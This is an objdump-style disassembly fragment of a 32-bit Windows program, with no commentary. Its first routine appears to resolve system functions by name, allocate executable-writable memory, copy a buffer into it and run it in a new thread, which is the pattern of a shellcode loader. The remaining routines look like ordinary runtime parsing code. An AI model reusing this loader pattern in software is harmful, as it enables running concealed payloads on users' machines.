  4017a5:	c7 44 24 04 54 50 44 	movl   $0x445054,0x4(%esp)
  4017ac:	00 
  4017ad:	8d 45 c4             	lea    -0x3c(%ebp),%eax
  4017b0:	89 04 24             	mov    %eax,(%esp)
  4017b3:	e8 d1 fd ff ff       	call   0x401589
  4017b8:	e8 86 fd ff ff       	call   0x401543
  4017bd:	c7 04 24 b7 f0 42 00 	movl   $0x42f0b7,(%esp)
  4017c4:	a1 54 62 44 00       	mov    0x446254,%eax
  4017c9:	ff d0                	call   *%eax
  4017cb:	83 ec 04             	sub    $0x4,%esp
  4017ce:	89 45 ec             	mov    %eax,-0x14(%ebp)
  4017d1:	c7 44 24 04 c1 f0 42 	movl   $0x42f0c1,0x4(%esp)
  4017d8:	00 
  4017d9:	8b 45 ec             	mov    -0x14(%ebp),%eax
  4017dc:	89 04 24             	mov    %eax,(%esp)
  4017df:	a1 5c 62 44 00       	mov    0x44625c,%eax
  4017e4:	ff d0                	call   *%eax
  4017e6:	83 ec 08             	sub    $0x8,%esp
  4017e9:	89 45 e8             	mov    %eax,-0x18(%ebp)
  4017ec:	c7 44 24 04 d9 f0 42 	movl   $0x42f0d9,0x4(%esp)
  4017f3:	00 
  4017f4:	8b 45 ec             	mov    -0x14(%ebp),%eax
  4017f7:	89 04 24             	mov    %eax,(%esp)
  4017fa:	a1 5c 62 44 00       	mov    0x44625c,%eax
  4017ff:	ff d0                	call   *%eax
  401801:	83 ec 08             	sub    $0x8,%esp
  401804:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  401807:	c7 44 24 04 ea f0 42 	movl   $0x42f0ea,0x4(%esp)
  40180e:	00 
  40180f:	8b 45 ec             	mov    -0x14(%ebp),%eax
  401812:	89 04 24             	mov    %eax,(%esp)
  401815:	a1 5c 62 44 00       	mov    0x44625c,%eax
  40181a:	ff d0                	call   *%eax
  40181c:	83 ec 08             	sub    $0x8,%esp
  40181f:	89 45 e0             	mov    %eax,-0x20(%ebp)
  401822:	c7 44 24 04 00 f1 42 	movl   $0x42f100,0x4(%esp)
  401829:	00 
  40182a:	8b 45 ec             	mov    -0x14(%ebp),%eax
  40182d:	89 04 24             	mov    %eax,(%esp)
  401830:	a1 5c 62 44 00       	mov    0x44625c,%eax
  401835:	ff d0                	call   *%eax
  401837:	83 ec 08             	sub    $0x8,%esp
  40183a:	89 45 dc             	mov    %eax,-0x24(%ebp)
  40183d:	a1 3c 62 44 00       	mov    0x44623c,%eax
  401842:	ff d0                	call   *%eax
  401844:	89 45 d8             	mov    %eax,-0x28(%ebp)
  401847:	c7 85 bc ef ff ff 00 	movl   $0x0,-0x1044(%ebp)
  40184e:	00 00 00 
  401851:	8d 45 c4             	lea    -0x3c(%ebp),%eax
  401854:	89 c1                	mov    %eax,%ecx
  401856:	e8 6d 02 02 00       	call   0x421ac8
  40185b:	89 85 b8 ef ff ff    	mov    %eax,-0x1048(%ebp)
  401861:	8b 45 e8             	mov    -0x18(%ebp),%eax
  401864:	c7 44 24 14 40 00 00 	movl   $0x40,0x14(%esp)
  40186b:	00 
  40186c:	c7 44 24 10 00 30 00 	movl   $0x3000,0x10(%esp)
  401873:	00 
  401874:	8d 95 b8 ef ff ff    	lea    -0x1048(%ebp),%edx
  40187a:	89 54 24 0c          	mov    %edx,0xc(%esp)
  40187e:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  401885:	00 
  401886:	8d 95 bc ef ff ff    	lea    -0x1044(%ebp),%edx
  40188c:	89 54 24 04          	mov    %edx,0x4(%esp)
  401890:	8b 55 d8             	mov    -0x28(%ebp),%edx
  401893:	89 14 24             	mov    %edx,(%esp)
  401896:	ff d0                	call   *%eax
  401898:	83 ec 18             	sub    $0x18,%esp
  40189b:	8b 85 bc ef ff ff    	mov    -0x1044(%ebp),%eax
  4018a1:	85 c0                	test   %eax,%eax
  4018a3:	75 0a                	jne    0x4018af
  4018a5:	bb ff ff ff ff       	mov    $0xffffffff,%ebx
  4018aa:	e9 ef 00 00 00       	jmp    0x40199e
  4018af:	8d 45 c4             	lea    -0x3c(%ebp),%eax
  4018b2:	89 c1                	mov    %eax,%ecx
  4018b4:	e8 0f 02 02 00       	call   0x421ac8
  4018b9:	89 c3                	mov    %eax,%ebx
  4018bb:	8d 45 c4             	lea    -0x3c(%ebp),%eax
  4018be:	89 c1                	mov    %eax,%ecx
  4018c0:	e8 df 5e 02 00       	call   0x4277a4
  4018c5:	8b 95 bc ef ff ff    	mov    -0x1044(%ebp),%edx
  4018cb:	89 5c 24 08          	mov    %ebx,0x8(%esp)
  4018cf:	89 44 24 04          	mov    %eax,0x4(%esp)
  4018d3:	89 14 24             	mov    %edx,(%esp)
  4018d6:	e8 65 6c 01 00       	call   0x418540
  4018db:	c7 85 b4 ef ff ff 00 	movl   $0x0,-0x104c(%ebp)
  4018e2:	00 00 00 
  4018e5:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  4018e8:	8b 95 bc ef ff ff    	mov    -0x1044(%ebp),%edx
  4018ee:	c7 44 24 28 00 00 00 	movl   $0x0,0x28(%esp)
  4018f5:	00 
  4018f6:	c7 44 24 24 00 00 00 	movl   $0x0,0x24(%esp)
  4018fd:	00 
  4018fe:	c7 44 24 20 00 00 00 	movl   $0x0,0x20(%esp)
  401905:	00 
  401906:	c7 44 24 1c 00 00 00 	movl   $0x0,0x1c(%esp)
  40190d:	00 
  40190e:	c7 44 24 18 00 00 00 	movl   $0x0,0x18(%esp)
  401915:	00 
  401916:	c7 44 24 14 00 00 00 	movl   $0x0,0x14(%esp)
  40191d:	00 
  40191e:	89 54 24 10          	mov    %edx,0x10(%esp)
  401922:	8b 55 d8             	mov    -0x28(%ebp),%edx
  401925:	89 54 24 0c          	mov    %edx,0xc(%esp)
  401929:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  401930:	00 
  401931:	c7 44 24 04 00 00 00 	movl   $0x20000000,0x4(%esp)
  401938:	20 
  401939:	8d 95 b4 ef ff ff    	lea    -0x104c(%ebp),%edx
  40193f:	89 14 24             	mov    %edx,(%esp)
  401942:	ff d0                	call   *%eax
  401944:	83 ec 2c             	sub    $0x2c,%esp
  401947:	8b 85 b4 ef ff ff    	mov    -0x104c(%ebp),%eax
  40194d:	85 c0                	test   %eax,%eax
  40194f:	74 48                	je     0x401999
  401951:	c7 85 a8 ef ff ff 00 	movl   $0xfa0a1f00,-0x1058(%ebp)
  401958:	1f 0a fa 
  40195b:	c7 85 ac ef ff ff ff 	movl   $0xffffffff,-0x1054(%ebp)
  401962:	ff ff ff 
  401965:	8b 45 e0             	mov    -0x20(%ebp),%eax
  401968:	8b 95 b4 ef ff ff    	mov    -0x104c(%ebp),%edx
  40196e:	8d 8d a8 ef ff ff    	lea    -0x1058(%ebp),%ecx
  401974:	89 4c 24 08          	mov    %ecx,0x8(%esp)
  401978:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  40197f:	00 
  401980:	89 14 24             	mov    %edx,(%esp)
  401983:	ff d0                	call   *%eax
  401985:	83 ec 0c             	sub    $0xc,%esp
  401988:	8b 45 dc             	mov    -0x24(%ebp),%eax
  40198b:	8b 95 b4 ef ff ff    	mov    -0x104c(%ebp),%edx
  401991:	89 14 24             	mov    %edx,(%esp)
  401994:	ff d0                	call   *%eax
  401996:	83 ec 04             	sub    $0x4,%esp
  401999:	bb 00 00 00 00       	mov    $0x0,%ebx
  40199e:	8d 45 c4             	lea    -0x3c(%ebp),%eax
  4019a1:	89 c1                	mov    %eax,%ecx
  4019a3:	e8 f4 5e 02 00       	call   0x42789c
  4019a8:	89 d8                	mov    %ebx,%eax
  4019aa:	eb 16                	jmp    0x4019c2
  4019ac:	89 c3                	mov    %eax,%ebx
  4019ae:	8d 45 c4             	lea    -0x3c(%ebp),%eax
  4019b1:	89 c1                	mov    %eax,%ecx
  4019b3:	e8 e4 5e 02 00       	call   0x42789c
  4019b8:	89 d8                	mov    %ebx,%eax
  4019ba:	89 04 24             	mov    %eax,(%esp)
  4019bd:	e8 3e f1 00 00       	call   0x410b00
  4019c2:	8b 5d fc             	mov    -0x4(%ebp),%ebx
  4019c5:	c9                   	leave
  4019c6:	c2 10 00             	ret    $0x10
  4019c9:	55                   	push   %ebp
  4019ca:	89 e5                	mov    %esp,%ebp
  4019cc:	83 ec 08             	sub    $0x8,%esp
  4019cf:	b9 3c 50 44 00       	mov    $0x44503c,%ecx
  4019d4:	e8 47 90 02 00       	call   0x42aa20
  4019d9:	c9                   	leave
  4019da:	c3                   	ret
  4019db:	55                   	push   %ebp
  4019dc:	89 e5                	mov    %esp,%ebp
  4019de:	83 ec 08             	sub    $0x8,%esp
  4019e1:	b9 54 50 44 00       	mov    $0x445054,%ecx
  4019e6:	e8 35 90 02 00       	call   0x42aa20
  4019eb:	c9                   	leave
  4019ec:	c3                   	ret
  4019ed:	55                   	push   %ebp
  4019ee:	89 e5                	mov    %esp,%ebp
  4019f0:	53                   	push   %ebx
  4019f1:	83 ec 24             	sub    $0x24,%esp
  4019f4:	8d 45 ee             	lea    -0x12(%ebp),%eax
  4019f7:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4019fa:	90                   	nop
  4019fb:	90                   	nop
  4019fc:	8d 45 ee             	lea    -0x12(%ebp),%eax
  4019ff:	89 44 24 04          	mov    %eax,0x4(%esp)
  401a03:	c7 04 24 54 f1 42 00 	movl   $0x42f154,(%esp)
  401a0a:	b9 3c 50 44 00       	mov    $0x44503c,%ecx
  401a0f:	e8 dc 8a 02 00       	call   0x42a4f0
  401a14:	83 ec 08             	sub    $0x8,%esp
  401a17:	8d 45 ee             	lea    -0x12(%ebp),%eax
  401a1a:	89 c1                	mov    %eax,%ecx
  401a1c:	e8 df 54 02 00       	call   0x426f00
  401a21:	90                   	nop
  401a22:	c7 04 24 c9 19 40 00 	movl   $0x4019c9,(%esp)
  401a29:	e8 d2 f9 ff ff       	call   0x401400
  401a2e:	8d 45 ef             	lea    -0x11(%ebp),%eax
  401a31:	89 45 f0             	mov    %eax,-0x10(%ebp)
  401a34:	90                   	nop
  401a35:	90                   	nop
  401a36:	8d 45 ef             	lea    -0x11(%ebp),%eax
  401a39:	89 44 24 04          	mov    %eax,0x4(%esp)
  401a3d:	c7 04 24 84 f1 42 00 	movl   $0x42f184,(%esp)
  401a44:	b9 54 50 44 00       	mov    $0x445054,%ecx
  401a49:	e8 a2 8a 02 00       	call   0x42a4f0
  401a4e:	83 ec 08             	sub    $0x8,%esp
  401a51:	8d 45 ef             	lea    -0x11(%ebp),%eax
  401a54:	89 c1                	mov    %eax,%ecx
  401a56:	e8 a5 54 02 00       	call   0x426f00
  401a5b:	90                   	nop
  401a5c:	c7 04 24 db 19 40 00 	movl   $0x4019db,(%esp)
  401a63:	e8 98 f9 ff ff       	call   0x401400
  401a68:	eb 2e                	jmp    0x401a98
  401a6a:	89 c3                	mov    %eax,%ebx
  401a6c:	8d 45 ee             	lea    -0x12(%ebp),%eax
  401a6f:	89 c1                	mov    %eax,%ecx
  401a71:	e8 8a 54 02 00       	call   0x426f00
  401a76:	90                   	nop
  401a77:	89 d8                	mov    %ebx,%eax
  401a79:	89 04 24             	mov    %eax,(%esp)
  401a7c:	e8 7f f0 00 00       	call   0x410b00
  401a81:	89 c3                	mov    %eax,%ebx
  401a83:	8d 45 ef             	lea    -0x11(%ebp),%eax
  401a86:	89 c1                	mov    %eax,%ecx
  401a88:	e8 73 54 02 00       	call   0x426f00
  401a8d:	90                   	nop
  401a8e:	89 d8                	mov    %ebx,%eax
  401a90:	89 04 24             	mov    %eax,(%esp)
  401a93:	e8 68 f0 00 00       	call   0x410b00
  401a98:	8b 5d fc             	mov    -0x4(%ebp),%ebx
  401a9b:	c9                   	leave
  401a9c:	c3                   	ret
  401a9d:	55                   	push   %ebp
  401a9e:	89 e5                	mov    %esp,%ebp
  401aa0:	83 ec 08             	sub    $0x8,%esp
  401aa3:	e8 45 ff ff ff       	call   0x4019ed
  401aa8:	c9                   	leave
  401aa9:	c3                   	ret
  401aaa:	90                   	nop
  401aab:	90                   	nop
  401aac:	66 90                	xchg   %ax,%ax
  401aae:	66 90                	xchg   %ax,%ax
  401ab0:	66 90                	xchg   %ax,%ax
  401ab2:	66 90                	xchg   %ax,%ax
  401ab4:	66 90                	xchg   %ax,%ax
  401ab6:	66 90                	xchg   %ax,%ax
  401ab8:	66 90                	xchg   %ax,%ax
  401aba:	66 90                	xchg   %ax,%ax
  401abc:	66 90                	xchg   %ax,%ax
  401abe:	66 90                	xchg   %ax,%ax
  401ac0:	57                   	push   %edi
  401ac1:	56                   	push   %esi
  401ac2:	89 ce                	mov    %ecx,%esi
  401ac4:	53                   	push   %ebx
  401ac5:	89 c3                	mov    %eax,%ebx
  401ac7:	89 d0                	mov    %edx,%eax
  401ac9:	83 fa 50             	cmp    $0x50,%edx
  401acc:	0f 87 ee 00 00 00    	ja     0x401bc0
  401ad2:	83 fa 34             	cmp    $0x34,%edx
  401ad5:	0f 87 9d 00 00 00    	ja     0x401b78
  401adb:	83 fa 29             	cmp    $0x29,%edx
  401ade:	76 18                	jbe    0x401af8
  401ae0:	8d 52 d6             	lea    -0x2a(%edx),%edx
  401ae3:	83 fa 08             	cmp    $0x8,%edx
  401ae6:	0f 87 ab 00 00 00    	ja     0x401b97
  401aec:	ff 24 95 00 f5 42 00 	jmp    *0x42f500(,%edx,4)
  401af3:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  401af7:	90                   	nop
  401af8:	83 fa 0a             	cmp    $0xa,%edx
  401afb:	0f 86 9f 00 00 00    	jbe    0x401ba0
  401b01:	8d 4a f5             	lea    -0xb(%edx),%ecx
  401b04:	ba 01 00 00 00       	mov    $0x1,%edx
  401b09:	d3 e2                	shl    %cl,%edx
  401b0b:	f7 c2 fe 1f 00 5f    	test   $0x5f001ffe,%edx
  401b11:	0f 85 99 00 00 00    	jne    0x401bb0
  401b17:	f7 c2 00 c0 7f 00    	test   $0x7fc000,%edx
  401b1d:	75 1d                	jne    0x401b3c
  401b1f:	81 e2 01 00 80 00    	and    $0x800001,%edx
  401b25:	74 70                	je     0x401b97
  401b27:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  401b2e:	66 90                	xchg   %ax,%ax
  401b30:	85 f6                	test   %esi,%esi
  401b32:	74 63                	je     0x401b97
  401b34:	8b 54 24 10          	mov    0x10(%esp),%edx
  401b38:	85 d2                	test   %edx,%edx
  401b3a:	74 5b                	je     0x401b97
  401b3c:	8b 4b 14             	mov    0x14(%ebx),%ecx
  401b3f:	3b 4b 18             	cmp    0x18(%ebx),%ecx
  401b42:	7d 53                	jge    0x401b97
  401b44:	8b 53 10             	mov    0x10(%ebx),%edx
  401b47:	8d 3c 89             	lea    (%ecx,%ecx,4),%edi
  401b4a:	83 c1 01             	add    $0x1,%ecx
  401b4d:	8d 14 ba             	lea    (%edx,%edi,4),%edx
  401b50:	c7 42 04 00 00 00 00 	movl   $0x0,0x4(%edx)
  401b57:	c7 42 08 00 00 00 00 	movl   $0x0,0x8(%edx)
  401b5e:	89 4b 14             	mov    %ecx,0x14(%ebx)
  401b61:	89 02                	mov    %eax,(%edx)
  401b63:	8b 44 24 10          	mov    0x10(%esp),%eax
  401b67:	89 72 0c             	mov    %esi,0xc(%edx)
  401b6a:	89 42 10             	mov    %eax,0x10(%edx)
  401b6d:	89 d0                	mov    %edx,%eax
  401b6f:	5b                   	pop    %ebx
  401b70:	5e                   	pop    %esi
  401b71:	5f                   	pop    %edi
  401b72:	c3                   	ret
  401b73:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  401b77:	90                   	nop
  401b78:	8d 4a cb             	lea    -0x35(%edx),%ecx
  401b7b:	ba 01 00 00 00       	mov    $0x1,%edx
  401b80:	d3 e2                	shl    %cl,%edx
  401b82:	f7 c2 07 11 c7 01    	test   $0x1c71107,%edx
  401b88:	75 26                	jne    0x401bb0
  401b8a:	81 e2 f8 2e 00 0a    	and    $0xa002ef8,%edx
  401b90:	75 9e                	jne    0x401b30
  401b92:	83 f8 4f             	cmp    $0x4f,%eax
  401b95:	74 a5                	je     0x401b3c
  401b97:	31 d2                	xor    %edx,%edx
  401b99:	5b                   	pop    %ebx
  401b9a:	89 d0                	mov    %edx,%eax
  401b9c:	5e                   	pop    %esi
  401b9d:	5f                   	pop    %edi
  401b9e:	c3                   	ret
  401b9f:	90                   	nop
  401ba0:	83 fa 04             	cmp    $0x4,%edx
  401ba3:	76 8b                	jbe    0x401b30
  401ba5:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  401bac:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  401bb0:	85 f6                	test   %esi,%esi
  401bb2:	75 88                	jne    0x401b3c
  401bb4:	31 d2                	xor    %edx,%edx
  401bb6:	eb e1                	jmp    0x401b99
  401bb8:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  401bbf:	90                   	nop
  401bc0:	8d 52 ae             	lea    -0x52(%edx),%edx
  401bc3:	83 fa 0c             	cmp    $0xc,%edx
  401bc6:	77 e8                	ja     0x401bb0
  401bc8:	ff 24 95 24 f5 42 00 	jmp    *0x42f524(,%edx,4)
  401bcf:	90                   	nop
  401bd0:	57                   	push   %edi
  401bd1:	56                   	push   %esi
  401bd2:	89 ce                	mov    %ecx,%esi
  401bd4:	53                   	push   %ebx
  401bd5:	8b 48 14             	mov    0x14(%eax),%ecx
  401bd8:	3b 48 18             	cmp    0x18(%eax),%ecx
  401bdb:	7d 4b                	jge    0x401c28
  401bdd:	89 d3                	mov    %edx,%ebx
  401bdf:	8b 50 10             	mov    0x10(%eax),%edx
  401be2:	8d 3c 89             	lea    (%ecx,%ecx,4),%edi
  401be5:	83 c1 01             	add    $0x1,%ecx
  401be8:	8d 14 ba             	lea    (%edx,%edi,4),%edx
  401beb:	c7 42 04 00 00 00 00 	movl   $0x0,0x4(%edx)
  401bf2:	c7 42 08 00 00 00 00 	movl   $0x0,0x8(%edx)
  401bf9:	89 48 14             	mov    %ecx,0x14(%eax)
  401bfc:	85 db                	test   %ebx,%ebx
  401bfe:	74 28                	je     0x401c28
  401c00:	85 f6                	test   %esi,%esi
  401c02:	7e 24                	jle    0x401c28
  401c04:	c7 42 04 00 00 00 00 	movl   $0x0,0x4(%edx)
  401c0b:	89 d0                	mov    %edx,%eax
  401c0d:	c7 42 08 00 00 00 00 	movl   $0x0,0x8(%edx)
  401c14:	c7 02 00 00 00 00    	movl   $0x0,(%edx)
  401c1a:	89 5a 0c             	mov    %ebx,0xc(%edx)
  401c1d:	89 72 10             	mov    %esi,0x10(%edx)
  401c20:	5b                   	pop    %ebx
  401c21:	5e                   	pop    %esi
  401c22:	5f                   	pop    %edi
  401c23:	c3                   	ret
  401c24:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  401c28:	31 d2                	xor    %edx,%edx
  401c2a:	5b                   	pop    %ebx
  401c2b:	5e                   	pop    %esi
  401c2c:	89 d0                	mov    %edx,%eax
  401c2e:	5f                   	pop    %edi
  401c2f:	c3                   	ret
  401c30:	55                   	push   %ebp
  401c31:	89 c5                	mov    %eax,%ebp
  401c33:	57                   	push   %edi
  401c34:	56                   	push   %esi
  401c35:	53                   	push   %ebx
  401c36:	83 ec 04             	sub    $0x4,%esp
  401c39:	8b 40 0c             	mov    0xc(%eax),%eax
  401c3c:	0f b6 08             	movzbl (%eax),%ecx
  401c3f:	80 f9 6e             	cmp    $0x6e,%cl
  401c42:	0f 84 98 00 00 00    	je     0x401ce0
  401c48:	8d 41 d0             	lea    -0x30(%ecx),%eax
  401c4b:	3c 09                	cmp    $0x9,%al
  401c4d:	0f 87 aa 00 00 00    	ja     0x401cfd
  401c53:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  401c5a:	31 db                	xor    %ebx,%ebx
  401c5c:	bf ff ff ff 7f       	mov    $0x7fffffff,%edi
  401c61:	be cd cc cc cc       	mov    $0xcccccccd,%esi
  401c66:	eb 32                	jmp    0x401c9a
  401c68:	eb 16                	jmp    0x401c80
  401c6a:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  401c71:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  401c78:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  401c7f:	90                   	nop
  401c80:	8d 04 9b             	lea    (%ebx,%ebx,4),%eax
  401c83:	8d 1c 41             	lea    (%ecx,%eax,2),%ebx
  401c86:	8b 45 0c             	mov    0xc(%ebp),%eax
  401c89:	8d 50 01             	lea    0x1(%eax),%edx
  401c8c:	89 55 0c             	mov    %edx,0xc(%ebp)
  401c8f:	0f b6 48 01          	movzbl 0x1(%eax),%ecx
  401c93:	8d 41 d0             	lea    -0x30(%ecx),%eax
  401c96:	3c 09                	cmp    $0x9,%al
  401c98:	77 26                	ja     0x401cc0
  401c9a:	83 e9 30             	sub    $0x30,%ecx
  401c9d:	89 fa                	mov    %edi,%edx
  401c9f:	0f be c9             	movsbl %cl,%ecx
  401ca2:	29 ca                	sub    %ecx,%edx
  401ca4:	89 d0                	mov    %edx,%eax
  401ca6:	f7 e6                	mul    %esi
  401ca8:	c1 ea 03             	shr    $0x3,%edx
  401cab:	39 da                	cmp    %ebx,%edx
  401cad:	7d d1                	jge    0x401c80
  401caf:	bb ff ff ff ff       	mov    $0xffffffff,%ebx
  401cb4:	83 c4 04             	add    $0x4,%esp
  401cb7:	89 d8                	mov    %ebx,%eax
  401cb9:	5b                   	pop    %ebx
  401cba:	5e                   	pop    %esi
  401cbb:	5f                   	pop    %edi
  401cbc:	5d                   	pop    %ebp
  401cbd:	c3                   	ret
  401cbe:	66 90                	xchg   %ax,%ax
  401cc0:	8b 14 24             	mov    (%esp),%edx
  401cc3:	89 d8                	mov    %ebx,%eax
  401cc5:	f7 d8                	neg    %eax
  401cc7:	85 d2                	test   %edx,%edx
  401cc9:	0f 45 d8             	cmovne %eax,%ebx
  401ccc:	83 c4 04             	add    $0x4,%esp
  401ccf:	89 d8                	mov    %ebx,%eax
  401cd1:	5b                   	pop    %ebx
  401cd2:	5e                   	pop    %esi
  401cd3:	5f                   	pop    %edi
  401cd4:	5d                   	pop    %ebp
  401cd5:	c3                   	ret
  401cd6:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  401cdd:	8d 76 00             	lea    0x0(%esi),%esi
  401ce0:	8d 50 01             	lea    0x1(%eax),%edx
  401ce3:	89 55 0c             	mov    %edx,0xc(%ebp)
  401ce6:	0f b6 48 01          	movzbl 0x1(%eax),%ecx
  401cea:	8d 41 d0             	lea    -0x30(%ecx),%eax
  401ced:	3c 09                	cmp    $0x9,%al
  401cef:	77 0c                	ja     0x401cfd
  401cf1:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)
  401cf8:	e9 5d ff ff ff       	jmp    0x401c5a
  401cfd:	31 db                	xor    %ebx,%ebx
  401cff:	eb b3                	jmp    0x401cb4
  401d01:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  401d08:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  401d0f:	90                   	nop
  401d10:	53                   	push   %ebx
  401d11:	89 c3                	mov    %eax,%ebx
  401d13:	85 d2                	test   %edx,%edx
  401d15:	74 19                	je     0x401d30
  401d17:	83 fa 68             	cmp    $0x68,%edx
  401d1a:	74 3a                	je     0x401d56
  401d1c:	89 d8                	mov    %ebx,%eax
  401d1e:	e8 0d ff ff ff       	call   0x401c30
  401d23:	8b 43 0c             	mov    0xc(%ebx),%eax
  401d26:	80 38 5f             	cmpb   $0x5f,(%eax)
  401d29:	74 25                	je     0x401d50
  401d2b:	31 c0                	xor    %eax,%eax
  401d2d:	5b                   	pop    %ebx
  401d2e:	c3                   	ret
  401d2f:	90                   	nop
  401d30:	8b 40 0c             	mov    0xc(%eax),%eax
  401d33:	80 38 00             	cmpb   $0x0,(%eax)
  401d36:	74 f3                	je     0x401d2b
  401d38:	8d 50 01             	lea    0x1(%eax),%edx
  401d3b:	89 53 0c             	mov    %edx,0xc(%ebx)
  401d3e:	0f be 00             	movsbl (%eax),%eax
  401d41:	83 f8 68             	cmp    $0x68,%eax
  401d44:	74 10                	je     0x401d56
  401d46:	83 f8 76             	cmp    $0x76,%eax
  401d49:	74 d1                	je     0x401d1c
  401d4b:	31 c0                	xor    %eax,%eax
  401d4d:	eb de                	jmp    0x401d2d
  401d4f:	90                   	nop
  401d50:	83 c0 01             	add    $0x1,%eax
  401d53:	89 43 0c             	mov    %eax,0xc(%ebx)
  401d56:	89 d8                	mov    %ebx,%eax
  401d58:	e8 d3 fe ff ff       	call   0x401c30
  401d5d:	8b 43 0c             	mov    0xc(%ebx),%eax
  401d60:	80 38 5f             	cmpb   $0x5f,(%eax)
  401d63:	75 c6                	jne    0x401d2b
  401d65:	83 c0 01             	add    $0x1,%eax
  401d68:	89 43 0c             	mov    %eax,0xc(%ebx)
  401d6b:	b8 01 00 00 00       	mov    $0x1,%eax
  401d70:	5b                   	pop    %ebx
  401d71:	c3                   	ret
  401d72:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  401d79:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  401d80:	55                   	push   %ebp
  401d81:	57                   	push   %edi
  401d82:	56                   	push   %esi
  401d83:	53                   	push   %ebx
  401d84:	89 c3                	mov    %eax,%ebx
  401d86:	89 d0                	mov    %edx,%eax
  401d88:	83 ec 04             	sub    $0x4,%esp
  401d8b:	8b 53 0c             	mov    0xc(%ebx),%edx
  401d8e:	0f b6 0a             	movzbl (%edx),%ecx
  401d91:	80 f9 52             	cmp    $0x52,%cl
  401d94:	74 12                	je     0x401da8
  401d96:	80 f9 4f             	cmp    $0x4f,%cl
  401d99:	74 0d                	je     0x401da8
  401d9b:	83 c4 04             	add    $0x4,%esp
  401d9e:	5b                   	pop    %ebx
  401d9f:	5e                   	pop    %esi
  401da0:	5f                   	pop    %edi
  401da1:	5d                   	pop    %ebp
  401da2:	c3                   	ret
  401da3:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  401da7:	90                   	nop
  401da8:	8b 6b 2c             	mov    0x2c(%ebx),%ebp
  401dab:	be 20 00 00 00       	mov    $0x20,%esi
  401db0:	8d 7d 03             	lea    0x3(%ebp),%edi
  401db3:	80 f9 52             	cmp    $0x52,%cl
  401db6:	74 28                	je     0x401de0
  401db8:	83 c2 01             	add    $0x1,%edx
  401dbb:	89 7b 2c             	mov    %edi,0x2c(%ebx)
  401dbe:	89 c1                	mov    %eax,%ecx
  401dc0:	89 d8                	mov    %ebx,%eax
  401dc2:	89 53 0c             	mov    %edx,0xc(%ebx)
  401dc5:	89 f2                	mov    %esi,%edx
  401dc7:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  401dce:	e8 ed fc ff ff       	call   0x401ac0
  401dd3:	83 c4 04             	add    $0x4,%esp
  401dd6:	5b                   	pop    %ebx
  401dd7:	5e                   	pop    %esi
  401dd8:	5f                   	pop    %edi
  401dd9:	5d                   	pop    %ebp
  401dda:	c3                   	ret
  401ddb:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  401ddf:	90                   	nop
  401de0:	8d 7d 02             	lea    0x2(%ebp),%edi
  401de3:	be 1f 00 00 00       	mov    $0x1f,%esi
  401de8:	eb ce                	jmp    0x401db8
  401dea:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
  401df0:	53                   	push   %ebx
  401df1:	89 c3                	mov    %eax,%ebx
  401df3:	8b 40 0c             	mov    0xc(%eax),%eax
  401df6:	80 38 5f             	cmpb   $0x5f,(%eax)
  401df9:	75 17                	jne    0x401e12
  401dfb:	8d 50 01             	lea    0x1(%eax),%edx
  401dfe:	89 53 0c             	mov    %edx,0xc(%ebx)
  401e01:	80 78 01 5f          	cmpb   $0x5f,0x1(%eax)
  401e05:	74 19                	je     0x401e20
  401e07:	89 d8                	mov    %ebx,%eax
  401e09:	e8 22 fe ff ff       	call   0x401c30
  401e0e:	85 c0                	test   %eax,%eax
  401e10:	78 3e                	js     0x401e50
  401e12:	b8 01 00 00 00       	mov    $0x1,%eax
  401e17:	5b                   	pop    %ebx
  401e18:	c3                   	ret
  401e19:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  401e20:	83 c0 02             	add    $0x2,%eax
  401e23:	89 43 0c             	mov    %eax,0xc(%ebx)
  401e26:	89 d8                	mov    %ebx,%eax
  401e28:	e8 03 fe ff ff       	call   0x401c30
  401e2d:	85 c0                	test   %eax,%eax
  401e2f:	78 1f                	js     0x401e50
  401e31:	83 f8 09             	cmp    $0x9,%eax
  401e34:	7e dc                	jle    0x401e12
  401e36:	8b 43 0c             	mov    0xc(%ebx),%eax
  401e39:	80 38 5f             	cmpb   $0x5f,(%eax)
  401e3c:	75 12                	jne    0x401e50
  401e3e:	83 c0 01             	add    $0x1,%eax
  401e41:	89 43 0c             	mov    %eax,0xc(%ebx)
  401e44:	eb cc                	jmp    0x401e12
  401e46:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  401e4d:	8d 76 00             	lea    0x0(%esi),%esi
  401e50:	31 c0                	xor    %eax,%eax
  401e52:	5b                   	pop    %ebx
  401e53:	c3                   	ret
  401e54:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  401e5b:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
  401e5f:	90                   	nop
  401e60:	85 d2                	test   %edx,%edx
  401e62:	0f 84 f1 00 00 00    	je     0x401f59
  401e68:	57                   	push   %edi
